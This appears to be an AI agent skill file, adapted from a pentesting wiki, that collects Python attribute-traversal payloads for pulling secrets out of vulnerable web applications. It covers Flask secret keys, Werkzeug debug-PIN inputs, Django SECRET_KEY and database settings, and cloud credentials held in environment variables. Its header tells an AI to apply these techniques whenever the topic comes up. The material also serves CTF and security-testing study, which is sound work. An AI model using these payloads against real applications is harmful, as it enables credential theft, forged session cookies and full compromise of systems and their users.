---
name: python-read-gadgets
description: Use Python internal read gadgets to extract secrets from vulnerable applications. Trigger this skill whenever the user mentions Python format string vulnerabilities, class pollution, Flask/Django secret extraction, Werkzeug debug console access, environment variable leakage, or any scenario where they have read-only access to Python internals but need to pivot to sensitive data. Also use when users ask about Python sandbox escapes, __globals__ traversal, sys.modules access, or CTF-style Python exploitation.
---

# Python Internal Read Gadgets

When you have **read-only access** to Python internals (via format strings, class pollution, or similar vulnerabilities), use these techniques to extract secrets and escalate privileges without code execution.

## When to Use This Skill

- You've identified a Python format string vulnerability
- You have class pollution access in a Python application
- You need to extract Flask/Django/Werkzeug secrets
- You're working on a CTF with Python sandbox constraints
- You need to traverse `__globals__` or `sys.modules` to reach sensitive data

## Core Concept

Different vulnerabilities like **Python Format Strings** or **Class Pollution** might allow you to **read Python internal data but won't allow you to execute code**. Your goal is to make the most of these read permissions to **obtain sensitive privileges and escalate the vulnerability**.

---

## Flask - Read Secret Key

The main page of a Flask application will probably have the **`app`** global object where the **secret is configured**.

### Direct Access

If the vulnerability is in the main file:

```python
app.secret_key
```

### Cross-File Traversal

If the vulnerability is in a different Python file, use this gadget to traverse to the main module:

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

**Use this payload to access `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileged Flask cookies.

---

## Werkzeug - Machine ID and Node UUID

Access the **machine_id** and **uuid node**, which are the **main secrets** you need to **generate the Werkzeug pin** for accessing the Python console in `/console` if debug mode is enabled:

```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```

> **Note**: You can get the server's local path to `app.py` by generating an error in the web page which will reveal the path.

If the vulnerability is in a different Python file, use the Flask traversal trick above to access objects from the main Python file.

---

## Django - SECRET_KEY and Settings Module

The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, database credentials, or signing salts:

### When DJANGO_SETTINGS_MODULE is Set (Usual Case)

```python
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY
```

### Through the Global Settings Proxy

```python
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```

### Cross-Module Access

If the vulnerable gadget is in another module, walk globals first:

```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```

Once the key is known, you can forge Django signed cookies or tokens similar to Flask.

---

## Environment Variables / Cloud Credentials

Many jails still import `os` or `sys` somewhere. Abuse any reachable function `__init__.__globals__` to pivot to the already-imported `os` module and dump **environment variables** containing API tokens, cloud keys, or flags:

### Via Subclass Enumeration

```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```

### Via Loaders (If Subclass Index is Filtered)

```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```

**Environment variables are frequently the only secrets needed to move from read to full compromise** (cloud IAM keys, database URLs, signing keys, etc.).

---

## Django-Unicorn Class Pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. Setting a property path such as `__init__.__globals__` let an attacker reach the component module globals and any imported modules (e.g., `settings`, `os`, `sys`). From there you can leak `SECRET_KEY`, `DATABASES`, or service credentials without code execution.

The exploit chain is purely read-based and uses the same dunder-gadget patterns as above.

---

## Gadget Chaining Patterns

Recent CTFs show reliable read chains built only with attribute access and subclass enumeration. Key patterns:

### Basic Traversal

```python
__init__.__globals__['module_name'].attribute
```

### Via sys.modules

```python
__init__.__globals__['sys'].modules['module_name'].attribute
```

### Via Loaders

```python
__loader__.__init__.__globals__['sys'].modules['module_name'].attribute
```

### Via Subclass Enumeration

```python
[c for c in object.__subclasses__() if 'target' in str(c)][0].__init__.__globals__['module'].attribute
```

### Community Resources

Use [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) - a community-maintained catalog of hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules`, and finally sensitive data. Use it to quickly adapt when indices or class names differ between Python minor versions.

---

## Quick Reference

| Target | Payload Pattern |
|--------|----------------|
| Flask secret | `__main__.app.secret_key` |
| Django SECRET_KEY | `sys.modules['django.conf'].settings.SECRET_KEY` |
| Environment vars | `__globals__['os'].environ['VAR_NAME']` |
| Werkzeug debug | `sys.modules[werkzeug.debug]._machine_id` |
| Cross-file access | `__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__` |

---

## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [Flask cookie signing exploitation](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)
- [Werkzeug debug console access](../../network-services-pentesting/pentesting-web/werkzeug.md)
